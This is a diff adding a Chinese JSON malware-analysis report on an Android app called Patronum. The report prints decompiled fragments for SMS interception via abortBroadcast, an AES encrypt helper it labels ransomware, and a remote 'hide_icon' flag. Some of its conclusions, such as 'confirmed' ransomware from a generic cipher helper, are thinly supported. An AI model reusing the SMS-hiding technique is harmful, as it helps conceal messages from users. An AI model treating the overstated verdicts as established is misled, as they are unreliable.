@@ -1,0 +1,139 @@
+{
+  "APK信息": {
+    "文件名": "3d1a3c48a71e6fa681c5b43c5d251c206c1332839e005f6aa0812e81c96941e3.apk",
+    "sha256": "3d1a3c48a71e6fa681c5b43c5d251c206c1332839e005f6aa0812e81c96941e3",
+    "包名": "com.patronum.android",
+    "应用名": "Patronum",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 641.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\patronum\\android\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) { abortBroadcast(); Bundle extras = intent.getExtras(); if (extras != null) { Object[] objArr = (Object[]) extras.get(\"pdus\"); SmsMessage[] smsMessageArr = new SmsMessage[objArr.length]; for (int i = 0; i < objArr.length; i++) { smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]); } } }",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n              abortBroadcast();\n              new StringBuilder();\n              Bundle extras = intent.getExtras();",
+          "behavior_description": "该广播接收器监听短信到达广播 android.provider.Telephony.SMS_RECEIVED，收到短信后立即调用 abortBroadcast() 终止广播继续传递，从而阻止系统短信应用和其他应用收到短信通知，实现短信拦截隐藏。随后从 Intent extras 中提取 pdus 数据并解析为 SmsMessage 对象，获取短信发送方地址和内容。数据流向：SMS_RECEIVED 广播 Intent(extras/pdus) → abortBroadcast() 拦截 + SmsMessage.createFromPdu() 解析短信内容",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\common\\util\\AES;",
+          "method_signature": "encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final byte[] IV = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n    public static byte[] encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3) {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        cipher.init(1, new SecretKeySpec(bArr2, \"AES\"), new IvParameterSpec(bArr3));\n        byte[] doFinal = cipher.doFinal(bArr);\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(doFinal.length);\n        byteArrayOutputStream.write(doFinal);\n        return byteArrayOutputStream.toByteArray();\n    }",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class AES {\n>>>     public static final byte[] IV = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n>>> \n>>>     public static byte[] encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3) {\n>>>         try {\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             cipher.init(1, new SecretKeySpec(bArr2, \"AES\"), new IvParameterSpec(bArr3));\n>>>             byte[] doFinal = cipher.doFinal(bArr);\n>>>             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(doFinal.length);\n>>>             byteArrayOutputStream.write(doFinal);\n              return byteArrayOutputStream.toByteArray();\n          } catch (Exception e) {\n              throw new RuntimeException(e);",
+          "behavior_description": "该类伪装在 com.google.android.gms.common.util 包路径下（非真实GMS类），提供AES/CBC/PKCS5Padding加密方法，使用全零硬编码IV（安全隐患），作为勒索软件的文件加密引擎，对用户文件数据进行AES加密后返回密文，实现勒索锁定。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmobi\\flame\\browserlibrary\\config\\jsonbean\\AppConfigBean;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "@SerializedName(\"hide_icon\")\npublic boolean hideIcon = false;",
+          "malicious_code_snippet_context": "      @SerializedName(\"guid_facebook\")\n      public String guidFacebook = \"https://www.facebook.com/suposec/\";\n  \n>>>     @SerializedName(\"hide_icon\")\n>>>     public boolean hideIcon = false;\n  \n      @SerializedName(\"is_old_main\")\n      public boolean is_old_main = false;",
+          "behavior_description": "AppConfigBean配置类中定义了hide_icon远程配置字段，通过JSON反序列化从C2服务器接收指令，控制应用图标的隐藏与显示。恶意软件可远程下发hide_icon=true使应用图标从启动器中消失，从而逃避用户察觉和卸载，为后续恶意行为（如广告欺诈、隐私窃取）提供隐蔽环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
